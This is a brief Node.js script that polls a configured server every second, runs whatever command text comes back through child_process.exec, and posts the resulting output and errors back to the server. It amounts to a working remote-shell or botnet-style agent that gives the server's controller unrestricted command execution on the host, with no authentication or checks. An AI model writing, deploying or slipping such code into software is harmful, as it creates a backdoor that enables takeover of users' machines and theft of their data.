/**
 * Created by Prakhar on 11/13/2014.
 */

var request = require('request');
var config = require('./config/config');
var exec = require('child_process').exec;

setInterval(function () {
  request({
    uri: 'http://' + config.serverLocation + ':' + config.serverPort + '/getCommand/?id=' + config.clientId,
    method: "GET",
    timeout: 1000,
    followRedirect: true,
    maxRedirects: 3
  }, function (error, response, body) {
    if (!error)
      exec(body, output);
  });
}, 1000);

function output(error, stdout, stderr) {
  request.post('http://' + config.serverLocation + ':' + config.serverPort + '/postExecute/'
      , {
        'id': config.clientId,
        'error': error,
        'stdout': stdout,
        'stderr': stderr
      },
      function (error, response, body) {
        if (error || response.statusCode != 200)
        {
          console.log('Error in sending post.');
        }
      });
}

